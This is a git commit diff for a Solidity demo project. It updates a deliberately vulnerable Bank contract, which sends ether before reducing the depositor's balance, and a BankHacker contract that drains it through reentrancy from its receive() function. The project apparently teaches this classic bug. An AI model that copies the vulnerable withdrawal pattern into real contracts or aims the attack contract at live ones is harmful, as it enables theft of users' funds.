cf0be989159753ab63d0d1757f469be54f49ad02
Rick Farina <rickrfarina@gmail.com>
2022-04-26 13:17:59 -0500

    updates to Bank & BankHacker. Added test Txs

--- contracts/Bank.sol
+++ contracts/Bank.sol
@@ -1,7 +1,25 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.11;
 
+/* 
+    @dev to catch errors on an address.transfer() function, the
+    invocation must be executed on an external function.
+
+    The transfer() function below will be used to perform
+    transfers from the bank contract that wants to try/catch
+    the invocation.
+ */
+contract CalledContract {
+    function transfer(address payable to, uint value) public {
+        // send funds via transfer()
+        to.transfer(value);
+    }
+
+}
+
 contract Bank {
+
+    CalledContract public externalContract;
 
     mapping(address => uint256) public depositBalance;
 
@@ -10,13 +28,30 @@ contract Bank {
         uint256 value
     );
 
-    event Withdrawal (
-        address fromAccount,
+    event FundsTransmitted (
+        address originTx,
+        address fromAddress,
+        address toAddress,
         uint256 value,
-        address origin,
-        bool txResult,
-        bytes callData
+        bool    txsuccess,
+        bytes   callData
     );
+
+    event FundsTransmissionFailure (
+        address fromAddress,
+        address toAddress,
+        uint256 value,
+        bytes  errorMessage
+    );
+
+    event DepositBalanceReduced (
+        uint balanceReducedBy,
+        uint newDepositBalance
+    );
+
+    constructor() {
+        externalContract = new CalledContract();
+    }
 
     function deposit(address payable depositor, uint value) external payable {
         /* 
@@ -29,19 +64,86 @@ contract Bank {
         emit DepositMade(depositor, value);
     }
 
+
     function withdraw(address payable withdrawToAddress, uint weiToWithdraw) external {
-        // send funds from depositBalance[msg.sender] to msg.sender
+        
         require(depositBalance[withdrawToAddress] >= weiToWithdraw, 'Not enough ether in depositor balance to withdraw');
 
-        (bool result, bytes memory data) = withdrawToAddress.call{value:weiToWithdraw}("");  // send money to withdrawToAddress B4 deducting depositBalance !!
-        depositBalance[withdrawToAddress] -= weiToWithdraw;
+        // // send requested funds via transfer()
+        // try externalContract.transfer(payable(withdrawToAddress), weiToWithdraw) {
 
-        emit Withdrawal(
-            withdrawToAddress, 
-            weiToWithdraw,
-            tx.origin,
-            result,
-            data
+        //     emit FundsTransmitted (
+        //         tx.origin,
+        //         address(this), 
+        //         withdrawToAddress, 
+        //         weiToWithdraw, 
+        //         true,
+        //         bytes("funds sent via transfer()...")
+        //     );
+
+        // } catch (bytes memory revertReason) {
+
+        //     emit FundsTransmissionFailure(
+        //         address(this), 
+        //         withdrawToAddress, 
+        //         weiToWithdraw, 
+        //         revertReason
+        //     );
+        // }
+
+
+        // // send requested funds via send()
+        // bool success = withdrawToAddress.send(weiToWithdraw);
+        // if (success) {
+        //     bytes memory data = bytes("no data with send()...");
+            
+        //     emit FundsTransmitted (
+        //         tx.origin,
+        //         address(this), 
+        //         withdrawToAddress, 
+        //         weiToWithdraw, 
+        //         success,
+        //         data
+        //     );
+        // } else {
+        //     bytes memory errorMessage = bytes("error on send()...");
+
+        //     emit FundsTransmissionFailure(
+        //         address(this), 
+        //         withdrawToAddress, 
+        //         weiToWithdraw, 
+        //         errorMessage);
+        // }
+
+        // send funds via call()
+        (bool success, bytes memory data) = withdrawToAddress.call{value:weiToWithdraw}("");  // send money to withdrawToAddress B4 deducting depositBalance !!
+        if (success) {
+            
+            emit FundsTransmitted (
+                tx.origin,
+                address(this), 
+                withdrawToAddress, 
+                weiToWithdraw, 
+                success,
+                data
+            );
+        } else {
+
+            emit FundsTransmissionFailure(
+                address(this), 
+                withdrawToAddress, 
+                weiToWithdraw, 
+                bytes("send funds via call() failed...")
+            );
+        }
+
+
+        // reduce balance
+        depositBalance[withdrawToAddress] -= weiToWithdraw;
+        
+        emit DepositBalanceReduced(
+            weiToWithdraw, 
+            depositBalance[withdrawToAddress]
         );
     }
     function getDepositBalance(address depositor) external view returns (uint256) {
@@ -49,6 +151,6 @@ contract Bank {
     }
 
     receive() external payable {
-        // allow ether to be posted to contract ether balance
+        // allow ether to be posted to this contract's ether balance
     }
 }
--- contracts/BankHacker.sol
+++ contracts/BankHacker.sol
@@ -8,21 +8,36 @@ pragma solidity ^0.8.11;
         bank, provided there is enough funds in the 
         contract's ether balance
     3. When the bank pays this contract, it will hit the 
-        fallback routine, which will accept the payment
+        receive (fallback) routine, which will accept the payment
         and then re-call the withdraw routine provided there
-        is at least 1 ether in the bank contract's account.
+        is at least 1 ether in the bank contract's account. This will
+        help to ensure the transaction is not reverted.
  */
  import "./Bank.sol";
 
 contract BankHacker {
+
     Bank public bank;
-    uint private hackAttempts = 0;
-    uint private maxHackAttempts = 1;
+    uint private hackAttemptNumber = 0;
+    uint private maxHackAttempts = 2;
+
+    event SendDeposit(
+        address depositToAddress,
+        uint    depositValue,
+        string  functionName
+    );
+
+    event RequestWithdrawal(
+        address withdrawToAddress,
+        uint    withdrawalValue,
+        string  functionName
+    );
 
     event HackerReceivedFunds(
         address hackerAddress,
-        uint hackedValue,
-        string functionName
+        uint    hackedValue,
+        uint    hackAttemptNumber,
+        string  functionName
     );
     constructor (address payable _bankAddress) {
         // Get reference to the Bank contract
@@ -34,8 +49,17 @@ contract BankHacker {
     }
     function makeDeposit() external {
         // make a deposit of 1 ether into the bank contract, then immediately withdraw
-        bank.deposit(payable(address(this)), 100 ether);
-        bank.withdraw(payable(address(this)), 1 ether);
+
+        uint depositValue = 100000000000000000000; // 100 ether
+
+        emit SendDeposit(
+            address(this),
+            depositValue, 
+            "makeDeposit"
+        );
+        
+        bank.deposit(payable(address(this)), depositValue);
+        this.withdraw();
 
     }
     function getDepositBalance() external view returns(uint) {
@@ -44,23 +68,38 @@ contract BankHacker {
 
     function withdraw () external payable {
   
-        require(address(bank).balance > 1 ether, 'Not enough funds to withdraw');
+        // reset hack attempts
+        hackAttemptNumber = 0;
 
-        bank.withdraw(payable(address(this)), 1 ether);
+        uint withdrawalValue = 1 ether; // 1 ether
 
-        emit HackerReceivedFunds(address(this), msg.value, "withdraw");
+        emit RequestWithdrawal(
+            address(this), 
+            withdrawalValue, 
+            "withdraw"
+        );
+
+        // normal withdrawal, not a "hack"
+        bank.withdraw(payable(address(this)), withdrawalValue);
+
     }
 
     receive () external payable {
-        emit HackerReceivedFunds(address(this), msg.value, "receive");
+        
 
-        hackAttempts += 1;
- 
-        // if((address(bank).balance > 1 ether) && (hackAttempts <= maxHackAttempts )) {
-        if( (address(bank).balance > 1 ether) ) {
-            
+        if( (address(bank).balance > 1 ether) && (hackAttemptNumber < maxHackAttempts) ) {
+
+            hackAttemptNumber += 1;
+
             bank.withdraw(payable(address(this)), 1 ether);
-        }
+            
+            emit HackerReceivedFunds(
+                address(this), 
+                msg.value, 
+                hackAttemptNumber, 
+                "receive"
+            );
+        } 
     }
 
 }
